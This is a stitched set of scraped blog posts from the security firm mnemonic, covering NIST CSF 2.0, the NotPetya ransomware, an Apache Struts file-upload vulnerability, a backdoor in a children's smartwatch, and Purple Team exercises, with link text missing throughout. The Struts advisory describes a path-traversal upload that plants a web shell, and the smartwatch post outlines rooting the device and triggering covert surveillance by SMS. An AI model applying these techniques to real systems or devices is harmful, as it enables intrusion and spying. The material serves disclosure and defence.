While antivirus and OS patching is still just as important as before, the need for full visibility combined with new security technologies has increased dramatically.Organisations are now moving towards more modern capabilities delivered by Managed Detection and Response (MDR) vendors like mnemonic. A core service within MDR has always been to harden endpoint security and maximise visibility.To be able to perform threat hunting and efficient incident response, access to all recorded activities is a key requirement. Without the full visibility from all endpoints and servers in your environment, incident response will be a tough task and will need to rely on a fragmented and limited data set, indicators and less hard-coded evidence.As the threat landscape has changed dramatically just over the last few years, with many critical attacks documented in public, mnemonic has decided to introduce a new platform for the Argus Endpoint Responder service: CrowdStrike Falcon Endpoint Protection. This product and this vendor has proven to deliver the best detection capabilities and the most flexible threat hunting tools to ensure mnemonic can provide services that protect customers in the best possible way.Modern incident response, investigations and threat hunting require much more detailed logs and longer log retention than what was required in the past. Argus Endpoint Responder powered by CrowdStrike technology will provide customers with the best security tooling to secure your endpoints.Argus Endpoint Responder is a module of a complete Managed Detection and Response (MDR) service.

{"title": "What’s new in the NIST CSF Framework 2.0", "ingress": "Significant updates to the widely used cybersecurity framework", "content": "In this blog post, we’ll go through some of the most important changes to the new version of the National Institute of Standards and Technology's (NIST) Cybersecurity Framework (CSF). This includes:NIST recently made the CSF 2.0 draft available for the public, and it’s clear to say that the new version intends to make sure CSF remains relevant in the future while still staying true to the original goals and objectives of the CSF.CSF 2.0 seems to be emphasising the importance of top-down governance and the integration of cybersecurity into overall business strategy. This is apparent from one of the most major changes from version 1.1; the new GOVERN function. This function emphasises that cybersecurity isn't just about IT; it's an integral part of an organisation's governance and strategic planning.NIST released  on August 8th, 2023. The framework, since its initial publication in 2014, has been widely adopted to mitigate cybersecurity risks. While CSF 1.1 remains effective, there's a consensus that the framework needs to be updated to address the ever changing cybersecurity landscape. The key changes in the new version include:The title of the framework has been changed from the original \"Framework for Improving Critical Infrastructure Cybersecurity\" to the more commonly used \"Cybersecurity Framework\". The scope has been expanded to cater to all organisations on a global scale, moving away from a focus solely on U.S. critical infrastructure.NIST has incorporated references to other recent resources, including t, , , and more.   The draft introduces Implementation Examples to provide action-oriented processes to achieve CSF Subcategories.A new function, \"GOVERN\", has been added to cover various aspects like organisational context, risk management strategy, cybersecurity supply chain risk management, and more. There's also guidance on integrating the framework with the NIST Privacy Framework and with enterprise risk management. Information on cybersecurity assessments has been updated with references to NIST SP 800-55. The importance of continuous improvement is emphasised, with a new Improvement Category in the IDENTIFY Function.NIST is actively seeking feedback on this draft and the related Implementation Examples draft. All feedback can be submitted to  by November 4th, 2023. Feedback received will be discussed and the final CSF 2.0 is expected to be published in early 2024.The NIST Cybersecurity Framework 2.0 provides a structured approach to managing cybersecurity risks. One of the core components of the framework is the \"Framework Core,\" which is a set of desired cybersecurity outcomes organised into , , and . Here's a brief overview:The Framework Core provides a set of activities, outcomes, and references that detail an approach to cybersecurity risks. It is designed to be intuitive and to act as a translation layer to enable communication between different teams within an organisation, from the executive level to the implementation and operations level.These are the primary high-level activities that form the backbone of the Framework Core. They help organisations manage and reduce cybersecurity risks in a coordinated manner. Within each function, there are categories that are specific outcomes of technical and/or management activities. These further divide each category into specific outcomes of activities. The Framework Core also provides two types of additional resources with information to help achieve the outcomes described in the Core’s Subcategories.The new version has 6 functions, 22 categories and 106 subcategories while the former had 5 functions, 23 categories and 108 subcategories.The table below shows the outcomes of the functions and categories as stated in the public draft: The circumstances — mission, stakeholder expectations, and legal, regulatory, and contractual requirements — surrounding the organization’s cybersecurity risk management decisions are understood The organization’s priorities, constraints, risk tolerance and appetite statements, and assumptions are established, communicated, and used to support operational risk decisions Cyber supply chain risk management processes are identified, established, managed, monitored, and improved by organizational stakeholdersRoles, Responsibilities, and Cybersecurity roles, responsibilities, and authorities to foster accountability, performance assessment, and continuous improvement are established and communicated Organizational cybersecurity policies, processes, and procedures are established, communicated, and enforced Results of organization-wide cybersecurity risk management activities and performance are used to inform, improve, and adjust the risk management strategy: Assets (e.g., data, hardware software, systems, facilities, services, people) that enable the organization to achieve business purposes are identified and managed consistent with their relative importance to organizational objectives and the organization’s risk strategy The organization understands the cybersecurity risk to the organization, assets, and individuals. Improvements to organizational cybersecurity risk management processes, procedures and activities are identified across all Framework Functions Access to physical and logical assets is limited to authorized users, services, and hardware, and is managed commensurate with the assessed risk of unauthorized access The organization’s personnel are provided cybersecurity awareness and training so they can perform their cybersecurity-related tasks Data is managed consistent with the organization’s risk strategy to protect the confidentiality, integrity, and availability of information The hardware, software (e.g., firmware, operating systems, applications), and services of physical and virtual platforms are managed consistent with the organization’s risk strategy to protect their confidentiality, integrity, and availability Security architectures are managed with the organization’s risk strategy to protect asset confidentiality, integrity, and availability, and organizational resilience Assets are monitored to find anomalies, indicators of compromise, and other potentially adverse events Anomalies, indicators of compromise, and other potentially adverse events are analyzed to characterize the events and detect cybersecurity incidents Responses to detected cybersecurity incidents are managed Investigation is conducted to ensure effective response and support forensics and recovery activities Response activities are coordinated with internal and external stakeholders as required by laws, regulations, or policies Activities are performed to prevent expansion of an event and mitigate its effects Restoration activities are performed to ensure operational availability of systems and services affected by cybersecurity incidents Restoration activities are coordinated with internal and external partiesLet’s dive-in to what it each of these functions mean: By introducing this function, NIST acknowledges the need for a foundational layer that goes beyond mere technical and operational considerations. Establishing and overseeing a cybersecurity strategy that aligns with the organisation's broader mission and risk appetite is crucial. This function emphasises that cybersecurity isn't just about IT; it's an integral part of an organisation's governance and strategic planning. While the essence of this function remains largely unchanged from the original CSF, the split with the GOVERN function enhances its significance. By linking identification of risks with the broader organisational mission defined under GOVERN, it ensures that risk management is contextual and tailored to the organisation. By implementing the necessary safeguards, an organisation can either prevent or reduce the impact of threats. The scope covers several layers, from user awareness training to the physical and virtual infrastructure resilience. The faster an organisation can detect a threat, the quicker it can respond and minimise damage. With an ever-evolving threat landscape, having robust detection mechanisms can make the difference between a minor incident and a major breach.: It's not always about prevention. Sometimes breaches happen, and when they do, the response can determine the overall impact. A swift, well-coordinated response can not only contain the damage but also preserve trust and reputation. After addressing a cybersecurity event, getting back to \"business as usual\" is vital. This function ensures that processes are in place to restore impacted assets and operations quickly and efficiently.Let further break-down each function into their categories:Organisational Context (GV.OC): Understanding the broader circumstances, including stakeholder expectations and legal requirements, to tailor cybersecurity practices to an organisation's unique needs ensures alignment of cybersecurity measures with the organisation's mission and objectives.Risk Management Strategy (GV.RM): Establishment and monitoring of the organisation’s cybersecurity risk management strategy in alignment with its broader mission ensures that every member of the organisation is aware of the risk parameters and can make decisions aligned with the broader risk management strategy.Cybersecurity Supply Chain Risk Management (GV.SC): Understanding and managing risks related to the supply chain, which can introduce vulnerabilities, emphasises the need for a systematic approach to manage supply chain risks and ensure third parties maintain adequate cybersecurity standards.Roles, Responsibilities, and Authorities (GV.RR): Clear definition of cybersecurity roles and responsibilities for accountability and efficient incident response ensures every team member is aware of their duties and knows the appropriate contacts in specific scenarios.Policies, Processes, and Procedures (GV.PO): Developing and maintaining clear policies, processes, and procedures for consistent and effective cybersecurity ensures formalised cybersecurity practices that allow for regular reviews and updates as threats and technologies evolve.Oversight (GV.OV): Ensuring that the cybersecurity strategy is continuously reviewed, updated, and overseen to remain relevant and effective maintains a feedback loop for refining strategies and rectifying any shortcomings in the current approach.Asset Management (ID.AM): Understanding and managing assets crucial to the organisation's business objectives ensures prioritisation of cybersecurity measures based on the significance of assets in line with the organisation's risk strategy.Risk Assessment (ID.RA): Comprehensive understanding of the cybersecurity risk to the organisation, its assets, and individuals provides a foundation for informed decision-making and prioritisation of cybersecurity efforts.Improvement (ID.IM): Identifying enhancements to the organisation's cybersecurity risk management processes and activities ensures continuous refinement and adaptation of cybersecurity measures across all framework Functions.Identity Management, Authentication, and Access Control (PR.AA): Limiting access to assets based on authorisation and assessed risk safeguards assets against unauthorised access, ensuring data integrity and confidentiality.Awareness and Training (PR.AT): Providing cybersecurity awareness and training to personnel equips staff with the knowledge and skills to perform cybersecurity-related tasks effectively.Data Security (PR.DS): Managing data in alignment with the organisation's risk strategy protects the confidentiality, integrity, and availability of information.Platform Security (PR.PS): Management of hardware, software, and services of platforms ensures the security of platforms, safeguarding against potential vulnerabilities.Technology Infrastructure Resilience (PR.IR): Management of security architectures to protect assets and ensure organisational resilience ensures the continuous availability and integrity of assets, even in adverse situations.Continuous Monitoring (DE.CM): Monitoring of assets to detect potential cybersecurity threats enables timely identification and mitigation of cybersecurity threats, reducing potential damage.Adverse Event Analysis (DE.AE): Analysis of anomalies and potential threats to detect cybersecurity incidents provides insights into the nature and severity of threats, guiding response measures.Incident Management (RS.MA): Management of responses to detected cybersecurity incidents ensures a coordinated and effective response to threats, minimising potential damage.Incident Analysis (RS.AN): Investigation of incidents to guide response and recovery efforts provides insights into the cause and impact of incidents, informing mitigation strategies.Incident Response Reporting and Communication (RS.CO): Coordination of response activities with stakeholders ensures a unified response and compliance with legal and regulatory requirements.Incident Mitigation (RS.MI): Activities to prevent the escalation of incidents and mitigate their effects reduce the impact of incidents, safeguarding assets and operations.Incident Recovery Plan Execution (RC.RP): Restoration activities post cybersecurity incidents ensure timely recovery of operations, minimising downtime and associated costs.Incident Recovery Communication (RC.CO): Coordination of recovery activities with internal and external parties ensures a unified recovery process and keeps stakeholders informed.Let’s take a look at the relationship between the two framework versions visualised by the . The diagrams below show the differences between the 1.1 and 2.0 versions of the framework collapsed at the category level.The most obvious change is the new GOVERN function built from several categories and subcategories in the 1.1 version of the Identify function: Moving to the IDENTIFY function, the new category Improvement (ID.IM) consolidates the separated Improvements categories in RESPOND and RECOVER functions in the former version. Another notable change in this function is how Asset Management (ID.AM) consolidates asset management practices from multiple PROTECT subcategories. In the PROTECT function Identity Management, Authentication, and Access Control (PR.AA) changes name from PR.AC and merges identity and access control practices into access permissions, entitlements, and authorisations. The former version categories Information Protection Processes and Procedures (PR.IP), Protective Technology (PR.PT), Detection Processes (DE.DP) are moved to several categories in different functions in the new version. In the DETECT function; integrity checking, formerly in PR.DS, are now unified in the Continuous Monitoring category (DE.CM). At the same time, Detection Processes (DS) is dropped and moved to other categories and functions. Finally, in the RESPOND and RECOVER functions, in the addition to the previously mentioned move of the separate improvement categories to its own Improvement (ID.IM) category in the IDENTIFY function, several merges and new subcategories are now present. The framework’s mechanism for describing an organisation’s current or target cybersecurity posture in terms of the Core’s outcomes is called a Framework Profile (Profile).A \"Profile\" is a representation of an organisation's cybersecurity outcomes based on its business needs and risk tolerance. Profiles are used to identify the current state of cybersecurity practices and the desired state, which helps organisations prioritise their actions and investments to improve cybersecurity. represent the \"as-is\" cybersecurity activities, outcomes, and practices that are currently implemented by an organisation. It provides a clear snapshot of the current cybersecurity posture of the organisation. represents the \"to-be\" state, outlining the organisation's desired cybersecurity outcomes. It's based on business needs, risk tolerance, and resources. The Target Profile can be used to identify gaps between the current state and the desired state.Organisations can start by selecting categories and subcategories from the CSF Core that are relevant to their business context, risk appetite, and cybersecurity requirements. They then align these categories and subcategories with their current cybersecurity practices to create the Current Profile. Next, they determine the desired outcomes and practices to create the Target Profile.By comparing the Current Profile with the Target Profile, organisations can identify gaps and prioritise areas that need improvement. In addition, Profiles can be used as a communication tool to discuss cybersecurity posture and goals with internal and external stakeholders. Nevertheless, by understanding the gaps between the Current and Target Profiles, organisations can allocate resources more effectively.Profiles are flexible and can be customised to fit the unique needs, risks, and priorities of each organisation. They can be industry-specific, align with other standards and best practices, or be tailored to address specific threats and vulnerabilities.In essence, Profiles in the NIST CSF provide a roadmap for organisations to move from their current cybersecurity posture to a more robust and resilient state, aligned with their business objectives and risk tolerance.A  is a Target Profile created to address shared interests and goals among a group of organisations. Organisations can consider using it as the basis for their own Target Profile. An example of a CSF 1.1 Community Profile is the  published in February 2022. This Ransomware Profile identifies the Cybersecurity Framework Version 1.1 security objectives that support the identification, protection against, detection, response to, and recovery from ransomware events. The profile serves as a guide for managing the risk of ransomware events, helping organisations assess their readiness to counter ransomware threats and handle potential consequences focusing on 69 subcategories of the total 108. More examples of CSF 1.1 Community Profiles can be found on the NIST Cybersecurity Framework website, which NIST will update as new Community Profiles that are developed for CSF 2.0.An online tool is available on the NIST CSF website to showcase the relationships between the Core and Informative References and Implementation examples. This tool, named , allows users to explore the Draft CSF 2.0 Core (Functions, Categories, Subcategories, Implementation Examples). The Tool offers human and machine-readable versions of the draft Core (in JSON and Excel). Informative References will be added once CSF 2.0 is finalised in early 2024, which will help to show the connection between the CSF and other cybersecurity frameworks, standards, guidelines, and resources. Since CSF 2.0 Implementation Examples and Informative References will be updated more frequently than the rest of the Core, they will be published and maintained online only. In conclusion, CSF 2.0 seems to be emphasising the importance of top-down governance and the integration of cybersecurity into overall business strategy.By adding GOVERN function, NIST appears to be addressing the need for a holistic approach to cybersecurity, one that embeds it into the very fabric of organisational strategy and governance. It's a recognition that in today's interconnected digital world, cybersecurity is not just a technical challenge but a strategic imperative.Ultimately, the evolution of the NIST Cybersecurity Framework from version 1.1 to 2.0, as evidenced by the shift from IDENTIFY to GOVERN, demonstrates the dynamic nature of cybersecurity and the need for frameworks to adapt to changing realities and feedback. It shows the intent to provide organisations with a tool that remains relevant and effective in managing and mitigating cybersecurity risks.", "url": "https://www.mnemonic.io/resources/blog/whats-new-in-the-nist-csf-framework-2.0/", "category": "resources", "subcategory": "blog"},

Apart from being Norway’s national cyber security championship, NCSC 2019 also forms the basis for the selection of participants to the team that will represent Norway during the European Cyber Security Challenge.25 people made their way to NTNU Gjøvik, most of whom qualified from the preliminary round at the beginning of March. After the national finals, the jury appointed this year’s national team. The competition had an upper age limit of 25, with five of the ten team members being juniors (16-20 years old), and the rest being seniors (20+ years old). In addition, the team has a supporting staff of six people.Simen and Bendik both work as security analysts in mnemonic. Simen holds a bachelor’s degree in Computer and Information Security from NTNU Gjøvik, and spends a significant part of his spare time with preserving slot machines and arcade hardware and software.Just like Simen, Bendik holds a bachelor degree in Computer and Information Security from NTNU Gjøvik. He is a member of TGHack and creates Capture the Flag (CTF) security tasks for The Gathering in his spare time. Earlier this year, Bendik also won the final of the Master of Cyber Security.Both have long experience with CTF competitions, and regularly participate in these. This is the third year in a row Simen is a part of the Norwegian national team, while Bendik is joining for the first time.The European Cyber Security Challenge 2019 is hosted by ENISA, and will this year take place in Bucharest, Romania. Here, top security talents from each participating country will meet to network and collaborate, and finally compete against each other in a technical CTF competition. Contestants will be challenged in solving security related tasks from domains such as web security, service security, hardware security, crypto puzzles, reverse engineering and forensics, and in the process collect points for solving them.To prepare, the Norwegian team have participated in two training gatherings, as well as they have done homework related to developing tasks. However, most of the preparatory training have involved playing CTFs arranged in the period leading up to the finals in Romania.According to Simen and Bendik, the most interesting thing about the competition is getting the opportunity to be challenged in their favourite disciplines, against opponents who are considered as the young and leading talents in their respective countries. Of course, being able to adorn yourself with a high ranking would have been fun, but the most amusing part is to show that you are able to solve good and challenging tasks.We wish Simen, Bendik and the Norwegian national team the best of luck!Read more about the .", "url": "https://www.mnemonic.io/company/whats-new/2019/mnemonic-employees-represent-norway-in-the-european-cyber-security-challenge-2019/", "category": "company", "subcategory": "whats-new"},

We partnered with the investment firm Ferd, moved our Oslo headquarters, and opened offices in London and now Palo Alto. We are all looking forward to this new chapter”, he says.The opening of the U.S. office will help serve the fast growing market for Managed Detection and Response (MDR) services. Gartner recently predicted in their Market Guide for Managed Detection and Response Services that by 2024, 25% of organisations globally will be using MDR services, up from less than 5% today.“We have seen an incredible increase in demand for MDR services globally.

Due to fake news postings, the facts surrounding this spread remain unclear.There is some confusion about the actual naming of the ransomware. Petya is a ransomware family, with several capabilities similar to the ransomware that started spreading yesterday (27.06.17). Kaspersky claims that yesterday’s variant is not based on Petya, naming it NotPetya instead. Others claim that this is a combination of several ransomwares, calling it GoldenEye. We refer to it as Petya in this advisory update, until another name is commonly agreed-upon.Petya is a ransomware with functionality for spreading to other hosts in the LAN of an infected host. It consists of several tools, and a successful infection makes the machine unusable.Most organizations have Windows installations that can be affected if they get an initial infection. If you have not observed the ransomware as of now – you might be lucky and avoid it. If you do not have any MeDoc installations, or control of the update process, we currently have no indicators that the ransomware will affect your organization. Several organizations have produced preliminary analyses of the ransomware. We recommend After initial infection, the ransomware will drop a tool in the %temp% folder, of what seems to be a lightweight version of Mimikatz that comes in both 32-bit and 64-bit flavors. The tools are used to steal valid credentials to spread to other hosts in the network.If Petya finds valid credentials, it will use either PsExec or WMIC to infect other computers connected to the LAN. It will scan for admin$ shares and connect to shares available for it to access.In addition to using dumping credentials, it also uses a Windows function called “CredEnumerateW” to find credentials in the local credential store.The ransomware can also perform lateral movement by using two exploits that came with the ShadowBrokers dump in April, called ETERNALBLUE and ETERNALROMANCE. These tools exploit vulnerabilities in SMBv1 (CVE-2017-0144 and CVE-2017-0145).

It follows a Model-View-Controller (MVC) architecture, and is widely utilised by various vendors in their product and services portfolio, and by organisations as in-house built applications.The vulnerability can be exploited by an attacker by manipulating file upload parameters, potentially leading to the upload of malicious files and subsequent server-side detonation (e.g. JSP files).At this time, mnemonic's assessment is that the vulnerability poses a medium-to-high threat for organisations for the following reasons:We consider the following factors to lower the risk level at this stage:We emphasise that this is a developing vulnerability and new information is likely to impact the threat level over the coming weeks.The following versions of the framework are vulnerable:Vendors are currently assessing their exposure to this vulnerability, such as:The vulnerability stems from a path traversal issue within file upload parameters of the \"ActionSupport\" class, allowing attackers to upload malicious files and execute arbitrary code on the targeted server. The class exhibits a bug in filename parameter filtering during file uploads, allowing arbitrary file write on a Struts Java server. This capability enables attackers to write server-side rendered files, like JSP files, into a target directory. Upon requesting the file, the JSP payload is executed, resulting in a compromised server.Successful exploitation involves uploading two files in a single POST request via the 'upload.action' action, with the first being benign and the second containing path traversal strings in the 'uploadFileName' parameter, (e.g. \"../../\"). As an example, for a web shell to be successfully deployed, the dropped file (e.g. 'webshell.jsp') must be in a valid route that an attacker can remotely reach, which will vary between implementations. This is likely to encourage vendor-specific research to determine the precise path for dropping a web shell.The exploitation of CVE-2023-50164 involves several preconditions that are dependent on the behaviour and implementation of the application using Apache Struts:mnemonic recommends the following actions:We are continuously monitoring the situation and developing detection logic for our Argus services.", "url": "https://www.mnemonic.io/resources/blog/advisory-cve-2023-50164-critical-rce-vulnerability-in-apache-struts/", "category": "resources", "subcategory": "blog"},

{"title": "Exposing covert surveillance backdoors in children’s smartwatches", "ingress": "Wearable smartphone from Chinese manufacturer includes hidden snapshot and wiretapping capabilities", "content": "This blog post provides a technical description of how we discovered a backdoor in a smartwatch made for children. The device is a wearable smartphone, and the backdoor enables remote and covert surveillance through wiretapping, taking pictures, and location tracking.The backdoor appears to be authored by the manufacturer of the watch, the Chinese technology company Qihoo 360. The watch is re-branded and sold to European and US markets by the Norwegian firm Xplora, who claim to have sold more than 350 000 smartwatches for children globally.The backdoor itself is not a vulnerability. It is a feature set developed with intent, with function names that include remote snapshot, send location and wiretap. The backdoor is activated by sending SMS commands to the watch.To trigger the backdoor, knowledge of a secret encryption key is required. Our research leads us to believe that the functionality cannot be used without knowledge of the key. However, as the technical run-through will show, there are several parties with the necessary access, including Xplora and Qihoo 360.Qihoo 360 and the US government have a documented history, with accusations that include foreign espionage and imposing export sanctions.All technical findings have been shared with Xplora and relevant authorities prior to publication. Children’s smartwatches are designed to enable parents to locate, track and communicate with their children. While they may look like a smartwatch, they are in fact and marketed as a child’s first phone.The exact features and functions will vary amongst providers, but the primary functions typically include:Children’s smartwatches have had a checkered past, to put it lightly. In 2017, mnemonic worked together with the Norwegian Consumer Council on the #WatchOut project. The study investigated the data handling and security mechanisms of four children’s smartwatches that were popular at the time. The full report can be found .The investigation in general revealed serious gaps in security across the market. The most serious finding at the time was that it was effectively possible to take control over some of the watches. Hence, an adversary could find the location of a child, or communicate directly with the child through the watch without the parent noticing.The project resulted, among other things, in:Amongst the four watches included in the #WatchOut study was one produced by Xplora.Xplora is a line of children's smartwatches sold by the Norwegian company XPLORA Mobile AS (and XPLORA Technologies AS outside of the Nordics). Their watches are sold throughout the Nordics, UK, Spain, Germany, France and Poland, and from mid-September 2020, the United States. On their website, they claim to have sold over  and have , and in  in 2019, they state that they had a turnover of over $9 million USD last year.Since the #WatchOut study, Xplora is emerging as one of the leaders in their geographical markets, and expanding into new territories.With this in mind, we thought it was a worthwhile endeavor to look at their updated model, the Xplora 4. In our previous assessment, our scope and focus was limited to the communication between the watch and the local servers, and the parental application. This time around decided to take a deeper look at the watch itself.To figure out how the Xplora worked, the first thing we needed to do was gain access to its software.Browsing through the menus on the watch revealed it was running Android Nougat, and that it had a Qualcomm Snapdragon Wear 2100 processor. As with any Android-based device, getting access as root is a good place to start. Root access would allow us to browse through the file system and look at the code it was running. With root, we would also be able set up a man-in-the-middle proxy and inspect its network traffic and communication.Enabling root access on an Android device usually starts with modifying the file system. If we wanted to do this, a USB was going to be helpful. Though after a quick look at the USB cable that came with the Xplora, it was apparent we needed something different.Some light soldering and two data lines later, we had a functioning USB cable.Qualcomm chipsets have an “EDL” mode, short for ‘emergency download’. Basically, this is a feature that allows manufacturers to flash new firmware to a device. It also conveniently allows you to download everything that is stored in the device’s flash memory. Using EDL mode we could take a snapshot of the device’s storage, inspect its contents, and make the necessary modifications to gain root.We found that holding both buttons on the side of the watch forced it into Android’s fastboot mode. From there you could issue the “fastboot oem edl” command to enter EDL mode. Alternatively, there are special USB cables that can be used to accomplish the same task. A quick Google search for “edl cable” returns a number of options.We used a somewhat interesting piece of software called Miracle Box that allows you to upload and download data through Qualcomm’s EDL interface.After reading the flash storage, Miracle Box saves each partition as an individual file. These partitions can be easily modified in Linux with the standard mount utilities. Editing the build.prop file in the system partition allowed us to enable the Android Debug Bridge (ADB). It was as simple as uncommenting a configuration option left in by the watch developers:#Set composition for USBpersist.sys.usb.config=diag,serial_smd,rmnet_qti_bam,adbWe uploaded the newly modified system partition, booted up the watch, and root!The next step was to start looking through the apps installed on the watch. Listing all packages with the “pm list packages” command returned a total of 90 applications. As you would expect, most were related to the Android OS or Qualcomm.However, 19 of the apps were authored by the original equipment manufacturer Qihoo 360, the earlier mentioned technology company based in China.It was a bit surprising to us that none of applications on the watch appeared to be authored by Xplora themselves. After some light research we discovered a nearly identical watch for sale in China, sold directly by Qihoo 360.The watch sold directly from Qihoo 360 is branded as the “360 Kids Guard”. Googling this term results in pages of articles on the product dating back as far as 2013, and the watch brand is also mentioned in past Securities and Exchange Commission (SEC) filings for Qihoo 360 Technology Co Ltd.A browse through the  for the Xplora App also makes several references to a company named “360 Kids Guard Co., Ltd.”, including them being a data processor:This led us to the conclusion that while Xplora had developed their own backend server infrastructure and parental companion app, the majority of the watch itself was developed by Qihoo 360.Qihoo 360 and the US government have a documented history, with accusations that include foreign espionage and imposing export sanctions.In June 2020, Qihoo 360’s Chinese and UK business entities (Qihoo 360 Technology Company and Qihoo 360 Technology Co. Ltd. respectively) were added to an export sanctions list by the US Department of Commerce, thereby placing restrictions on the companies from using exported US technology in their products. As documented in the official records from , it’s not revealed exactly why they were placed on the list, but the official wording is “there is reasonable cause to believe that these entities pose a significant risk of becoming involved in activities—the procurement of commodities and technologies for military end-use in China—that are contrary to the national security interests of the United States.”Meanwhile in March 2020, . The report cites evidence of the CIA hacking toolset \"Vault 7\" that was leaked in 2017.After poking around a bit, we noticed a suspicious looking package  named “Persistent Connection Service”. The application starts automatically at boot and iterates through all applications installed on the watch. As it goes through each application, it creates a list of intents that it can call. The Qihoo 360 code calls these “rules”.In Android, intents are a messaging framework that allow one application to talk with another. Think about when you click a link on your phone, but somehow it magically opens Facebook. That’s done through intents.The code above is part of the iteration process that builds these rules, and conveniently prints out debug information to the Android system log as it runs.Reviewing the Android log, we can see that the Qihoo contact application has several intents related to wiretapping – namely WIRETAP_INCOMING and WIRETAP_BY_CALL_BACK. These have been added as rules to a component of the persistent connection service called the “command dispatcher”.In essence, this part of the code is searching through the device to determine a list of possible commands it can call.Now of course a command called wiretap got our attention. Further digging revealed a collection of suspicious, surveillance related commands:If we wanted to run these commands, the next step was to figure out how to activate the command dispatcher. The Android manifest states that the application listens for several broadcast intents that get sent to a “CoreBroadcastReceiver” class. This seemed like a good place to look.At this point we knew that the persistent connection service was collecting a list of possible commands, and that the command dispatcher was presumably capable of receiving commands and forwarding them along to different applications. The “com.qihoo.kidwatch.action.sms.command” intent filter in the manifest hinted that the SMS application was capable of sending commands to this command dispatcher, and that’s where we looked next.Sure enough, the Qihoo SMS application has a “dispatchCommand” method that receives encrypted SMS messages, and if successfully decrypted, forwards them along through a broadcast message to the command dispatcher.To summarize, the command dispatcher iterates through applications and their intents, or commands. In order to call those commands, something needs to call the command dispatcher. The Qihoo SMS application can receive encrypted SMS messages that in turn call the command dispatcher.Encrypted SMS > Command Dispatcher > Application commands (remote snapshot, for example).Or in short – an encrypted SMS can be sent to the watch to trigger the surveillance functions.Next was to put our findings to the test to find out if all this code actually worked. We decided to focus our efforts on the remote snapshot function. In order to do this, we needed a way to generate encrypted messages, and send them to our watch. We walked through the decompiled code to reverse engineer the syntax, and built our own command designed to trigger a remote snapshot from the camera application.The SMS messages are RC4 encrypted with a four byte “hardcode” that’s stored in the NVRAM and set when the watch is manufactured. We were able to retrieve our own key by reviewing the Android system logs, and by using a Qualcomm tool called QPST to dump the NVRAM.Sending the SMS triggered a picture to be taken on the watch, and it was immediately uploaded to Xplora’s server. There was zero indication on the watch that a photo was taken. The screen remained off the entire time.Xplora now has a nice photo of our office ceiling sitting on their server.To utilize this backdoor somebody would need access to two pieces of information: (1) the device’s phone number, and (2) the factory programmed encryption key. Based on our observations we see a few plausible scenarios where somebody could get access to both.Let’s start with the phone number, which is not particularly secret to begin with. Here are a few locations we believe it’s stored:One noteworthy point to make is that we did not see Qihoo directly collecting our device’s phone number. Though we don’t necessarily think this means that they can’t, or don’t. During our tests we observed the watch communicating directly with Qihoo owned servers in China. The domains included:This mainly appeared to consist of diagnostic reports, though some of this data was encrypted, or otherwise obfuscated. There was a large amount of code related to this reporting functionality and we were unable to thoroughly review all of it. It was not entirely clear to us what all this code was doing.Xplora’s backend server is also interesting to consider here. The communication between the watch and Xplora was performed in a very unique manner, which involved encrypted JSON objects. The watch performed this communication with code developed by Qihoo.It is a reasonable assumption that the server-side component receiving this data also has elements developed by Qihoo 360, however this was not within the scope of our research.The second part to this puzzle is the encryption key:In other terms, it isn’t exactly a limited group with access to these two puzzle pieces.There is no shortage of discussions that may be spawned from this type of finding, spanning IT security to ethics, geo-politics and beyond.From an IT security perspective, the issue here is that this backdoor exists in the first place. This ability to issue wiretaps or take secret pictures over SMS is not a software vulnerability, a misconfiguration or an oversight in using outdated protocols. This is a functionality that has been created with intent.What exactly is that intent?To be continued… Want to get in touch with mnemonic about these findings?

{"title": "Purple Team Part 1: Improve your defensive success with Purple Team exercises", "ingress": "What happens when the Blue and Red team joins forces? Learn about how Purple Team testing can improve your organisations' security posture.", "content": "Want to know more about this topic? Read our Effective cyber defence requires protection and the ability to detect and respond to threats. Performing Purple Team exercises is an excellent approach to testing and improving these capabilities through collaboration. Purple Team exercises enable an organisation to measure and verify that it can detect and respond to real attacks and use this information to immediately improve its defensive security capabilities.If you are interested in detection and response or responsible for this in an organisation, this blog post will tell you why Purple Team exercises should be on your radar. In this blog post, we'll let you know why that is, describe the concept of Purple Team exercises and introduce the mnemonic Purple Team platform.Over the last year, we've developed Purple Team exercises as a service and delivered numerous exercises that have proven effective in advancing organisations' defences. Purple Team is a relatively new concept and service, but as we are deeply committed to improving the security of our organisations, it's time to share what we have learned. We have identified three main benefits of Purple team exercises:The main purpose of a Purple Team exercise is to get the attacking (Red) and defensive (Blue) teams working together to improve an organisation's cyber defence. There are some challenges with achieving this today:Purple Team exercises try to address these challenges by:Purple Team exercises aim to assess and improve an organisation's capability to detect and respond to real cyber-attacks. They involve Red Team members simulating attacks and Blue Team members detecting and responding to them, with the two teams collaborating as the temporary Purple Team. The figure below illustrates the roles of the Blue and Red Teams and how they make up the Purple Team through collaboration.Purple Team exercises are a relatively new concept. Our Red Team has not found a standard definition or ideal \"Purple Team\" reference point. Organisations often mean wildly different things when they say Purple Team, and this is a common problem in the cybersecurity industry. We had to step back and find a clear, concise definition. While \"Purple Teaming\", applying the word Team as a verb, is sometimes used to separate it as a concept instead of a fixed theme, we wanted to go further.We found the book  and the document  Both are excellent primers to Purple Team as concept and by using these to gain a better understanding of goals and methodology, we arrived at the following single-sentence definition:Beyond landing a standard definition, we also had to develop a robust method, a common framework for how these exercises are planned, executed, reported and, most importantly, used to improve the organisations we test. We found two methods:The Prepare, Execute, Identify, and Remediate (PEIR) method is from The Purple Team Strategies. It represents a Purple Team method where both the Red and Blue Teams are involved, and the Blue Team is engaged in the exercise from the preparation stage. The following figures represent the high-level process:Not too far from it is the method description for Purple Team exercises in the Scythe Purple Team Framework v2. It describes a similar method but provides even more detail on how each Team should operate for each phase of the exercise. We've grown fond of both these methods and apply their concepts to our Purple Team method.Throughout 2022 and early 2023, we've performed tens of Purple Team exercises in Norway and internationally. We're also satisfied with the breadth of sectors we've had the chance to perform Purple Team exercises with, including:Through these exercises, we have had the chance to collaborate with some talented Blue Teams and SOCs, who have all been highly committed to integrating themselves into the testing and improving their organisations' detection capabilities. Their response to Purple Team exercises has been overwhelmingly positive. In some organisations, the improvements were so significant that they immediately invited us to perform more exercises. Let us look at our most essential and visible change: the mnemonic Purple Team platform., made by , is a \"true\" Purple Team platform, meaning its sole purpose is planning, executing and reporting Purple Team exercises. The idea with Vectr is that both the Red and Blue Team and the organisation have access and can see everything at all times. Vectr supports all our test scenarios, and we can design custom scenarios for our customers. It quickly solved many of our challenges with how we did Purple Team exercises in 2022 and gave us a much better way of performing them at scale.We want to mention that VECTR is an officially licensed product and we have an enterprise license agreement with SRA for its usage. So while Vectr is distributed for free by SRA for internal use, we encourage being good enterprise partners if you are using Vectr in a consultancy solution like we are. We hope this agreement allows SRA to get more funding for VECTR, grow the development team, and make more features faster. Further down in 